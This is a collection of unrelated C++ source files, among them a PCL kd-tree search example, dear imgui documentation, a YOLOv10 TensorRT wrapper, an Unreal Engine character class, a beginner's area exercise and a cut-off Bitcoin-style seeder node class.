    "/*\n * @Description: https://www.cnblogs.com/li-yao7758258/p/6437440.html\n * @Author: HCQ\n * @Company(School): UCAS\n * @Email: 1756260160@qq.com\n * @Date: 2020-10-08 21:46:40\n * @LastEditTime: 2020-10-27 16:03:16\n * @FilePath: /pcl-learning/02kdtree/1kdtree_search/kdtree_search.cpp\n */\n\n\n#include <pcl/point_cloud.h>        //\u70b9\u7c7b\u578b\u5b9a\u4e49\u5934\u6587\u4ef6\n#include <pcl/kdtree/kdtree_flann.h> //kdtree\u7c7b\u5b9a\u4e49\u5934\u6587\u4ef6\n\n#include <iostream>\n#include <vector>\n#include <ctime>\n\nint\nmain(int argc, char** argv)\n{\n    srand(time(NULL));   //\u7528\u7cfb\u7edf\u65f6\u95f4\u521d\u59cb\u5316\u968f\u673a\u79cd\u5b50\n    //\u521b\u5efa\u4e00\u4e2aPointCloud<pcl::PointXYZ>\n    pcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\n\n    // \u968f\u673a\u70b9\u4e91\u751f\u6210\n    cloud->width = 1000;             //\u6b64\u5904\u70b9\u4e91\u6570\u91cf\n    cloud->height = 1;                //\u8868\u793a\u70b9\u4e91\u4e3a\u65e0\u5e8f\u70b9\u4e91\n    cloud->points.resize(cloud->width * cloud->height);\n\n    for (size_t i = 0; i < cloud->points.size(); ++i)   //\u5faa\u73af\u586b\u5145\u70b9\u4e91\u6570\u636e\n    {\n        cloud->points[i].x = 1024.0f * rand() / (RAND_MAX + 1.0f); // // \u4ea7\u751f\u6570\u503c\u4e3a0-1024\u7684\u6d6e\u70b9\u6570\n        cloud->points[i].y = 1024.0f * rand() / (RAND_MAX + 1.0f);\n        cloud->points[i].z = 1024.0f * rand() / (RAND_MAX + 1.0f);\n    }\n    //\u521b\u5efaKdTreeFLANN\u5bf9\u8c61\uff0c\u5e76\u628a\u521b\u5efa\u7684\u70b9\u4e91\u8bbe\u7f6e\u4e3a\u8f93\u5165,\u521b\u5efa\u4e00\u4e2asearchPoint\u53d8\u91cf\u4f5c\u4e3a\u67e5\u8be2\u70b9\n    pcl::KdTreeFLANN<pcl::PointXYZ> kdtree; // pcl::KdTreeFLANN<PointT, Dist>::setInputCloud (const PointCloudConstPtr &cloud, const IndicesConstPtr &indices)\n    //\u8bbe\u7f6e\u641c\u7d22\u7a7a\u95f4\n    kdtree.setInputCloud(cloud);\n    //\u8bbe\u7f6e\u67e5\u8be2\u70b9\u5e76\u8d4b\u968f\u673a\u503c\n    pcl::PointXYZ searchPoint;\n    searchPoint.x = 1024.0f * rand() / (RAND_MAX + 1.0f);\n    searchPoint.y = 1024.0f * rand() / (RAND_MAX + 1.0f);\n    searchPoint.z = 1024.0f * rand() / (RAND_MAX + 1.0f);\n\n    // K \u4e34\u8fd1\u641c\u7d22\n    //\u521b\u5efa\u4e00\u4e2a\u6574\u6570\uff08\u8bbe\u7f6e\u4e3a10\uff09\u548c\u4e24\u4e2a\u5411\u91cf\u6765\u5b58\u50a8\u641c\u7d22\u5230\u7684K\u8fd1\u90bb\uff0c\u4e24\u4e2a\u5411\u91cf\u4e2d\uff0c\u4e00\u4e2a\u5b58\u50a8\u641c\u7d22\u5230\u67e5\u8be2\u70b9\u8fd1\u90bb\u7684\u7d22\u5f15\uff0c\u53e6\u4e00\u4e2a\u5b58\u50a8\u5bf9\u5e94\u8fd1\u90bb\u7684\u8ddd\u79bb\u5e73\u65b9\n    int K = 10;\n\n    std::vector<int> pointIdxNKNSearch(K);      //\u5b58\u50a8\u67e5\u8be2\u70b9\u8fd1\u90bb\u7d22\u5f15\n    std::vector<float> pointNKNSquaredDistance(K); //\u5b58\u50a8\u8fd1\u90bb\u70b9\u5bf9\u5e94\u8ddd\u79bb\u5e73\u65b9\n    //\u6253\u5370\u76f8\u5173\u4fe1\u606f\n    std::cout << \"K nearest neighbor search at (\" << searchPoint.x\n        << \" \" << searchPoint.y\n        << \" \" << searchPoint.z\n        << \") with K=\" << K << std::endl;\n\n    if (kdtree.nearestKSearch(searchPoint, K, pointIdxNKNSearch, pointNKNSquaredDistance) > 0)  //\u6267\u884cK\u8fd1\u90bb\u641c\u7d22\n    {\n        //\u6253\u5370\u6240\u6709\u8fd1\u90bb\u5750\u6807\n        for (size_t i = 0; i < pointIdxNKNSearch.size(); ++i)\n            std::cout << \"    \" << cloud->points[pointIdxNKNSearch[i]].x\n            << \" \" << cloud->points[pointIdxNKNSearch[i]].y\n            << \" \" << cloud->points[pointIdxNKNSearch[i]].z\n            << \" (squared distance: \" << pointNKNSquaredDistance[i] << \")\" << std::endl;\n    }\n    /**********************************************************************************\n     \u4e0b\u9762\u7684\u4ee3\u7801\u5c55\u793a\u67e5\u627e\u5230\u7ed9\u5b9a\u7684searchPoint\u7684\u67d0\u4e00\u534a\u5f84\uff08\u968f\u673a\u4ea7\u751f\uff09\u5185\u6240\u6709\u8fd1\u90bb\uff0c\u91cd\u65b0\u5b9a\u4e49\u4e24\u4e2a\u5411\u91cf\n     pointIdxRadiusSearch  pointRadiusSquaredDistance\u6765\u5b58\u50a8\u5173\u4e8e\u8fd1\u90bb\u7684\u4fe1\u606f\n     ********************************************************************************/\n     // \u534a\u5f84 R\u5185\u8fd1\u90bb\u641c\u7d22\u65b9\u6cd5\n\n    std::vector<int> pointIdxRadiusSearch;           //\u5b58\u50a8\u8fd1\u90bb\u7d22\u5f15\n    std::vector<float> pointRadiusSquaredDistance;   //\u5b58\u50a8\u8fd1\u90bb\u5bf9\u5e94\u8ddd\u79bb\u7684\u5e73\u65b9\n\n    float radius = 256.0f * rand() / (RAND_MAX + 1.0f);   //\u968f\u673a\u7684\u751f\u6210\u67d0\u4e00\u534a\u5f84\n    //\u6253\u5370\u8f93\u51fa\n    std::cout << \"Neighbors within radius search at (\" << searchPoint.x\n        << \" \" << searchPoint.y\n        << \" \" << searchPoint.z\n        << \") with radius=\" << radius << std::endl;\n\n    // \u5047\u8bbe\u6211\u4eec\u7684kdtree\u8fd4\u56de\u4e86\u5927\u4e8e0\u4e2a\u8fd1\u90bb\u3002\u90a3\u4e48\u5b83\u5c06\u6253\u5370\u51fa\u5728\u6211\u4eec\"searchPoint\"\u9644\u8fd1\u768410\u4e2a\u6700\u8fd1\u7684\u90bb\u5c45\u5e76\u628a\u5b83\u4eec\u5b58\u5230\u5148\u524d\u521b\u7acb\u7684\u5411\u91cf\u4e2d\u3002\n    if (kdtree.radiusSearch(searchPoint, radius, pointIdxRadiusSearch, pointRadiusSquaredDistance) > 0)  //\u6267\u884c\u534a\u5f84R\u5185\u8fd1\u90bb\u641c\u7d22\u65b9\u6cd5\n    {\n        for (size_t i = 0; i < pointIdxRadiusSearch.size(); ++i)\n            std::cout << \"    \" << cloud->points[pointIdxRadiusSearch[i]].x\n            << \" \" << cloud->points[pointIdxRadiusSearch[i]].y\n            << \" \" << cloud->points[pointIdxRadiusSearch[i]].z\n            << \" (squared distance: \" << pointRadiusSquaredDistance[i] << \")\" << std::endl;\n    }\n\n\n    return 0;\n}\n\n// K nearest neighbor search at (384.369 386.372 300.143) with K=10\n//     451.114 363.553 229.213 (squared distance: 10006.7)\n//     452.721 398.977 207.076 (squared distance: 13492.4)\n//     276.971 343.368 327.111 (squared distance: 14111)\n//     447.772 491.576 334 (squared distance: 16234.2)\n//     410.276 386.502 175.288 (squared distance: 16259.9)\n//     445.201 488.637 253.626 (squared distance: 16322.6)\n//     257.128 435.577 321.633 (squared distance: 19073.3)\n//     312.382 389.858 178.369 (squared distance: 20023)\n//     439.166 412.965 167.177 (squared distance: 21390)\n//     482.03 493.711 266.617 (squared distance: 22183.4)\n// Neighbors within radius search at (384.369 386.372 300.143) with radius=193.159\n//     451.114 363.553 229.213 (squared distance: 10006.7)\n//     452.721 398.977 207.076 (squared distance: 13492.4)\n//     276.971 343.368 327.111 (squared distance: 14111)\n//     447.772 491.576 334 (squared distance: 16234.2)\n//     410.276 386.502 175.288 (squared distance: 16259.9)\n//     445.201 488.637 253.626 (squared distance: 16322.6)\n//     257.128 435.577 321.633 (squared distance: 19073.3)\n//     312.382 389.858 178.369 (squared distance: 20023)\n//     439.166",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "// Advent2023.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include \"one.h\"\n#include \"two.h\"\n#include \"three.h\"\n#include \"four.h\"\n#include \"five.h\"\n#include \"FileReader.h\"\n#include \"Logger.h\"\n#include <ctime>\n\nvoid Execute(bool& activeRef);\n\nint main()\n{\n    clock_t time_req;\n    time_req = clock();\n\n    bool active = true;\n\n    while (active)\n    {\n        Execute(active);\n\n        clock_t currentTimeClock = clock() - time_req;\n        float currentTime = (float)currentTimeClock/CLOCKS_PER_SEC;\n\n        // 5 min\n        if (currentTime >= 300)\n        {\n            active = false;\n            DEBUG_LOG_1(\"Something is wrong with my code! Time: \", currentTime)\n        }\n    }\n}\nvoid Execute(bool& activeRef)\n{\n    std::cout << \"Hello World!\\n\";\n\n    FileReader fileReader;\n    string content = fileReader.GetFileContent(\"input5_1.txt\");\n\n    //one* first = new one();\n    //first->Run(firstContent);\n    //first->Run_2(firstContent);\n\n    //two second;\n    ////second.Run(content);\n    //second.Run_2(content);\n\n    //three third;\n    //third.Run(content);\n    //third.Run_2(content);\n\n    //four fourth;\n    //fourth.Run(content);\n    //fourth.Run_2(content);\n\n    five fifth;\n    //fifth.Run(content);\n    fifth.Run_2(content);\n\n    activeRef = false;\n}\n",
    "/*\n Copyright 2009-2012 Karsten Ahnert\n Copyright 2009-2012 Mario Mulansky\n\n Distributed under the Boost Software License, Version 1.0.\n (See accompanying file LICENSE_1_0.txt or\n copy at http://www.boost.org/LICENSE_1_0.txt)\n */\n\n/* example showing how odeint can be used with std::list */\n\n#include <iostream>\n#include <cmath>\n#include <list>\n\n#include <boost/numeric/odeint.hpp>\n\n//[ list_bindings\ntypedef std::list<double> state_type;\n\nnamespace boost {\nnamespace numeric {\nnamespace odeint {\n\ntemplate <>\nstruct is_resizeable<state_type> {  // declare resizeability\n  typedef boost::true_type type;\n  const static bool value = type::value;\n};\n\ntemplate <>\nstruct same_size_impl<state_type, state_type> {  // define how to check size\n  static bool same_size(const state_type& v1, const state_type& v2) {\n    return v1.size() == v2.size();\n  }\n};\n\ntemplate <>\nstruct resize_impl<state_type, state_type> {  // define how to resize\n  static void resize(state_type& v1, const state_type& v2) {\n    v1.resize(v2.size());\n  }\n};\n}\n}\n}\n//]\n\nvoid lattice(const state_type& x, state_type& dxdt, const double /* t */) {\n  state_type::const_iterator x_begin = x.begin();\n  state_type::const_iterator x_end = x.end();\n  state_type::iterator dxdt_begin = dxdt.begin();\n\n  x_end--;  // stop one before last\n  while (x_begin != x_end) {\n    *(dxdt_begin++) = std::sin(*(x_begin) - *(x_begin++));\n  }\n  *dxdt_begin = sin(*x_begin - *(x.begin()));  // periodic boundary\n}\n\nusing namespace boost::numeric::odeint;\n\nint main() {\n  const int N = 32;\n  state_type x;\n  for (int i = 0; i < N; ++i)\n    x.push_back(1.0 * i / N);\n\n  integrate_const(runge_kutta4<state_type>(), lattice, x, 0.0, 10.0, 0.1);\n}\n",
    "#include \"yolov10.h\"\n#include \"decode_yolov10.h\"\n\nYOLOV10::YOLOV10(const utils::InitParameter &param) : yolo::YOLO(param) {}\n\nbool YOLOV10::init(const std::vector<unsigned char> &trtFile) {\n  if (trtFile.empty()) {\n    return false;\n  }\n  std::unique_ptr<nvinfer1::IRuntime> runtime =\n      std::unique_ptr<nvinfer1::IRuntime>(\n          nvinfer1::createInferRuntime(sample::gLogger.getTRTLogger()));\n  if (runtime == nullptr) {\n    return false;\n  }\n  this->m_engine = std::unique_ptr<nvinfer1::ICudaEngine>(\n      runtime->deserializeCudaEngine(trtFile.data(), trtFile.size()));\n\n  if (this->m_engine == nullptr) {\n    return false;\n  }\n  this->m_context = std::unique_ptr<nvinfer1::IExecutionContext>(\n      this->m_engine->createExecutionContext());\n  if (this->m_context == nullptr) {\n    return false;\n  }\n  if (m_param.dynamic_batch) {\n    this->m_context->setInputShape(\n        this->m_engine->getIOTensorName(0),\n        nvinfer1::Dims4(m_param.batch_size, 3, m_param.dst_h, m_param.dst_w));\n  }\n  m_output_dims =\n      this->m_context->getTensorShape(this->m_engine->getIOTensorName(1));\n  m_total_objects = m_output_dims.d[1];\n  assert(m_param.batch_size <= m_output_dims.d[1]);\n  m_output_area = 1;\n  for (int i = 1; i < m_output_dims.nbDims; i++) {\n    if (m_output_dims.d[i] != 0) {\n      m_output_area *= m_output_dims.d[i];\n    }\n  }\n  CHECK(cudaMalloc(&m_output_src_device,\n                   m_param.batch_size * m_output_area * sizeof(float)));\n  float a = float(m_param.dst_h) / m_param.src_h;\n  float b = float(m_param.dst_w) / m_param.src_w;\n  float scale = a < b ? a : b;\n  cv::Mat src2dst =\n      (cv::Mat_<float>(2, 3) << scale, 0.f,\n       (-scale * m_param.src_w + m_param.dst_w + scale - 1) * 0.5, 0.f, scale,\n       (-scale * m_param.src_h + m_param.dst_h + scale - 1) * 0.5);\n  cv::Mat dst2src = cv::Mat::zeros(2, 3, CV_32FC1);\n  std::cout << src2dst.at<float>(0, 1) << \"111\" << src2dst.at<float>(1, 0)\n            << std::endl;\n  cv::invertAffineTransform(src2dst, dst2src);\n\n  m_dst2src.v0 = dst2src.ptr<float>(0)[0];\n  m_dst2src.v1 = dst2src.ptr<float>(0)[1];\n  m_dst2src.v2 = dst2src.ptr<float>(0)[2];\n  m_dst2src.v3 = dst2src.ptr<float>(1)[0];\n  m_dst2src.v4 = dst2src.ptr<float>(1)[1];\n  m_dst2src.v5 = dst2src.ptr<float>(1)[2];\n\n  return true;\n}\n\nvoid YOLOV10::preprocess(const std::vector<cv::Mat> &imgsBatch) {\n  resizeDevice(m_param.batch_size, m_input_src_device, m_param.src_w,\n               m_param.src_h, m_input_resize_device, m_param.dst_w,\n               m_param.dst_h, 114, m_dst2src);\n  bgr2rgbDevice(m_param.batch_size, m_input_resize_device, m_param.dst_w,\n                m_param.dst_h, m_input_rgb_device, m_param.dst_w,\n                m_param.dst_h);\n  normDevice(m_param.batch_size, m_input_rgb_device, m_param.dst_w,\n             m_param.dst_h, m_input_norm_device, m_param.dst_w, m_param.dst_h,\n             m_param);\n  hwc2chwDevice(m_param.batch_size, m_input_norm_device, m_param.dst_w,\n                m_param.dst_h, m_input_hwc_device, m_param.dst_w,\n                m_param.dst_h);\n}\n\nvoid YOLOV10::postprocess(const std::vector<cv::Mat> &imgsBatch) {\n  yolov10::decodeDevice(m_param, m_output_src_device, 6, m_total_objects,\n                        m_output_area, m_output_objects_device,\n                        m_output_objects_width, m_param.topK);\n  CHECK(cudaMemcpy(m_output_objects_host, m_output_objects_device,\n                   m_param.batch_size * sizeof(float) * (1 + 6 * m_param.topK),\n                   cudaMemcpyDeviceToHost));\n  for (size_t bi = 0; bi < imgsBatch.size(); bi++) {\n    int num_boxes =\n        std::min((int)(m_output_objects_host +\n                       bi * (m_param.topK * m_output_objects_width + 1))[0],\n                 m_param.topK);\n    for (size_t i = 0; i < num_boxes; i++) {\n      float *ptr = m_output_objects_host +\n                   bi * (m_param.topK * m_output_objects_width + 1) +\n                   m_output_objects_width * i + 1;\n      float x_lt = m_dst2src.v0 * ptr[0] + m_dst2src.v1 * ptr[1] + m_dst2src.v2;\n      float y_lt = m_dst2src.v3 * ptr[0] + m_dst2src.v4 * ptr[1] + m_dst2src.v5;\n      float x_rb = m_dst2src.v0 * ptr[2] + m_dst2src.v1 * ptr[3] + m_dst2src.v2;\n      float y_rb = m_dst2src.v3 * ptr[2] + m_dst2src.v4 * ptr[3] + m_dst2src.v5;\n      m_objectss[bi].emplace_back(x_lt, y_lt, x_rb, y_rb, ptr[4], (int)ptr[5]);\n    }\n  }\n}\n",
    "#include <iostream>\n#include \"CssManager.h\"\n\nCssManager::CssManager() {\n    provider = gtk_css_provider_new();\n    provider2 = gtk_css_provider_new();\n    context = gtk_style_context_new();\n}\nCssManager::~CssManager() {\n    g_object_unref(provider);\n    g_object_unref(provider2);\n    g_object_unref(context);\n}\n\n// Load styles from a file\nvoid CssManager::loadFromFile(const gchar *filename) {\n    gtk_css_provider_load_from_file(provider, g_file_new_for_path(filename), nullptr);\n    gtk_style_context_add_provider_for_screen(gdk_screen_get_default(),\n                                              GTK_STYLE_PROVIDER(provider),\n                                              GTK_STYLE_PROVIDER_PRIORITY_USER);\n}\n// Load styles from a string\nvoid CssManager::loadFromData(const gchar *data) {\n    gtk_css_provider_load_from_data(provider2, data, -1, nullptr);\n    gtk_style_context_add_provider_for_screen(gdk_screen_get_default(),\n                                              GTK_STYLE_PROVIDER(provider2),\n                                              GTK_STYLE_PROVIDER_PRIORITY_USER);\n}\nvoid CssManager::loadFromHex(unsigned char* hex, unsigned int hex_len) {\n    std::string decoded_text;\n\n    for (unsigned int i = 0; i < hex_len; ++i) {\n        decoded_text += hex[i];\n    }\n\n    CssManager::loadFromData(decoded_text.c_str());\n}",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"UnrealEngineCourseCharacter.h\"\n#include \"UnrealEngineCourseProjectile.h\"\n#include \"Animation/AnimInstance.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n\n\n//////////////////////////////////////////////////////////////////////////\n// AUnrealEngineCourseCharacter\n\nAUnrealEngineCourseCharacter::AUnrealEngineCourseCharacter()\n{\n\t// Character doesn't have a rifle at start\n\tbHasRifle = false;\n\tBulletCount = 25;\n\t\n\t// Set size for collision capsule\n\tGetCapsuleComponent()->InitCapsuleSize(55.f, 96.0f);\n\t\t\n\t// Create a CameraComponent\t\n\tFirstPersonCameraComponent = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FirstPersonCamera\"));\n\tFirstPersonCameraComponent->SetupAttachment(GetCapsuleComponent());\n\tFirstPersonCameraComponent->SetRelativeLocation(FVector(-10.f, 0.f, 60.f)); // Position the camera\n\tFirstPersonCameraComponent->bUsePawnControlRotation = true;\n\n\t// Create a mesh component that will be used when being viewed from a '1st person' view (when controlling this pawn)\n\tMesh1P = CreateDefaultSubobject<USkeletalMeshComponent>(TEXT(\"CharacterMesh1P\"));\n\tMesh1P->SetOnlyOwnerSee(true);\n\tMesh1P->SetupAttachment(FirstPersonCameraComponent);\n\tMesh1P->bCastDynamicShadow = false;\n\tMesh1P->CastShadow = false;\n\t//Mesh1P->SetRelativeRotation(FRotator(0.9f, -19.19f, 5.2f));\n\tMesh1P->SetRelativeLocation(FVector(-30.f, 0.f, -150.f));\n\n}\n\nvoid AUnrealEngineCourseCharacter::BeginPlay()\n{\n\t// Call the base class  \n\tSuper::BeginPlay();\n\n\t//Add Input Mapping Context\n\tif (APlayerController* PlayerController = Cast<APlayerController>(Controller))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(PlayerController->GetLocalPlayer()))\n\t\t{\n\t\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t\t}\n\t}\n\n}\n\n//////////////////////////////////////////////////////////////////////////// Input\n\nvoid AUnrealEngineCourseCharacter::SetupPlayerInputComponent(class UInputComponent* PlayerInputComponent)\n{\n\t// Set up action bindings\n\tif (UEnhancedInputComponent* EnhancedInputComponent = CastChecked<UEnhancedInputComponent>(PlayerInputComponent))\n\t{\n\t\t//Jumping\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Triggered, this, &ACharacter::Jump);\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Completed, this, &ACharacter::StopJumping);\n\n\t\t//Moving\n\t\tEnhancedInputComponent->BindAction(MoveAction, ETriggerEvent::Triggered, this, &AUnrealEngineCourseCharacter::Move);\n\n\t\t//Looking\n\t\tEnhancedInputComponent->BindAction(LookAction, ETriggerEvent::Triggered, this, &AUnrealEngineCourseCharacter::Look);\n\t}\n}\n\n\nvoid AUnrealEngineCourseCharacter::Move(const FInputActionValue& Value)\n{\n\t// input is a Vector2D\n\tFVector2D MovementVector = Value.Get<FVector2D>();\n\n\tif (Controller != nullptr)\n\t{\n\t\t// add movement \n\t\tAddMovementInput(GetActorForwardVector(), MovementVector.Y);\n\t\tAddMovementInput(GetActorRightVector(), MovementVector.X);\n\t}\n}\n\nvoid AUnrealEngineCourseCharacter::Look(const FInputActionValue& Value)\n{\n\t// input is a Vector2D\n\tFVector2D LookAxisVector = Value.Get<FVector2D>();\n\n\tif (Controller != nullptr)\n\t{\n\t\t// add yaw and pitch input to controller\n\t\tAddControllerYawInput(LookAxisVector.X);\n\t\tAddControllerPitchInput(LookAxisVector.Y);\n\t}\n}\n\nvoid AUnrealEngineCourseCharacter::SetHasRifle(bool bNewHasRifle)\n{\n\tbHasRifle = bNewHasRifle;\n}\n\nbool AUnrealEngineCourseCharacter::GetHasRifle()\n{\n\treturn bHasRifle;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint area(int length)//square\r\n{\r\n    return(length*length);\r\n}\r\nint area(int length,int width)//rectangle\r\n{\r\n    return(length*width);\r\n}\r\nfloat area(float radius)//circle\r\n{\r\n    return (3.14*radius*radius);\r\n}\r\ndouble area(double base,double height)//triangle\r\n{\r\n    return(base*height)/2;\r\n}\r\nint main()\r\n{\r\n    int length,width,rectangle,square;\r\n    float radius,circle;\r\n    double base,height,triangle;\r\n\r\n    cout<<\"Enter the length = \";\r\n    cin>>length;\r\n    square=area(length);\r\n    cout<<\"Area of the Square = \"<<square<<endl;\r\n\r\n    cout<<\"Enter the width = \";\r\n    cin>>width;\r\n    rectangle=area(length*width);\r\n    cout<<\"Area of the Rectangle = \"<<rectangle<<endl;\r\n\r\n    cout<<\"Enter the Radius = \";\r\n    cin>>radius;\r\n    circle=area(radius);\r\n    cout<<\"Area of the Circle = \"<<circle<<endl;\r\n\r\n    cout<<\"Enter the base = \";\r\n    cin>>base;\r\n    cout<<\"Enter the height = \";\r\n    cin>>height;\r\n    square=area(base,height);\r\n    cout<<\"Area of the Triangle = \"<<triangle<<endl;\r\n\r\n\r\n    return 0;\r\n}",
    "#include <algorithm>\n\n#include \"db.h\"\n#include \"netbase.h\"\n#include \"protocol.h\"\n#include \"serialize.h\"\n#include \"uint256.h\"\n\n#define BITCOIN_SEED_NONCE  0x0539a019ca550825ULL\n\nusing namespace std;\n\nclass CNode {\n  SOCKET sock;\n  CDataStream vSend;\n  CDataStream vRecv;\n  unsigned int nHeaderStart;\n  unsigned int nMessageStart;\n  int nVersion;\n  string strSubVer;\n  int nStartingHeight;\n  vector<CAddress> *vAddr;\n  int ban;\n  int64 doneAfter;\n  CAddress you;\n\n  int GetTimeout() {\n      if (you.IsTor())\n          return 120;\n      else\n          return 30;\n  }\n\n  void BeginMessage(const char *pszCommand) {\n    if (nHeaderStart != -1) AbortMessage();\n    nHeaderStart = vSend.size();\n    vSend << CMessageHeader(pszCommand, 0);\n    nMessageStart = vSend.size();\n//    printf(\"%s: SEND %s\\n\", ToString(you).c_str(), pszCommand); \n  }\n  \n  void AbortMessage() {\n    if (nHeaderStart == -1) return;\n    vSend.resize(nHeaderStart);\n    nHeaderStart = -1;\n    nMessageStart = -1;\n  }\n  \n  void EndMessage() {\n    if (nHeaderStart == -1) return;\n    unsigned int nSize = vSend.size() - nMessageStart;\n    memcpy((char*)&vSend[nHeaderStart] + offsetof(CMessageHeader, nMessageSize), &nSize, sizeof(nSize));\n    if (vSend.GetVersion() >= 209) {\n      uint256 hash = Hash(vSend.begin() + nMessageStart, vSend.end());\n      unsigned int nChecksum = 0;\n      memcpy(&nChecksum, &hash, sizeof(nChecksum));\n      assert(nMessageStart - nHeaderStart >= offsetof(CMessageHeader, nChecksum) + sizeof(nChecksum));\n      memcpy((char*)&vSend[nHeaderStart] + offsetof(CMessageHeader, nChecksum), &nChecksum, sizeof(nChecksum));\n    }\n    nHeaderStart = -1;\n    nMessageStart = -1;\n  }\n  \n  void Send() {\n    if (sock == INVALID_SOCKET) return;\n    if (vSend.empty()) return;\n    int nBytes = send(sock, &vSend[0], vSend.size(), 0);\n    if (nBytes > 0) {\n      vSend.erase(vSend.begin(), vSend.begin() + nBytes);\n    } else {\n      close(sock);\n      sock = INVALID_SOCKET;\n    }\n  }\n  \n  void PushVersion() {\n    int64 nTime = time(NULL);\n    uint64 nLocalNonce = BITCOIN_SEED_NONCE;\n    int64 nLocalServices = 0;\n    CAddress me(CService(\"0.0.0.0\"));\n    BeginMessage(\"version\");\n    int nBestHeight = GetRequireHeight();\n    string ver = \"/nito-seeder:0.01/\";\n    uint8_t fRelayTxs = 0;\n    vSend << PROTOCOL_VERSION << nLocalServices << nTime << you << me << nLocalNonce << ver << nBestHeight << fRelayTxs;\n    EndMessage();\n  }\n \n  void GotVersion() {\n    // printf(\"\\n%s: version %i\\n\", ToString(you).c_str(), nVersion);\n    if (vAddr) {\n      BeginMessage(\"getaddr\");\n      EndMessage();\n      doneAfter = time(NULL) + GetTimeout();\n    } else {\n      doneAfter = time(NULL) + 1;\n    }\n  }\n\n  bool ProcessMessage(string 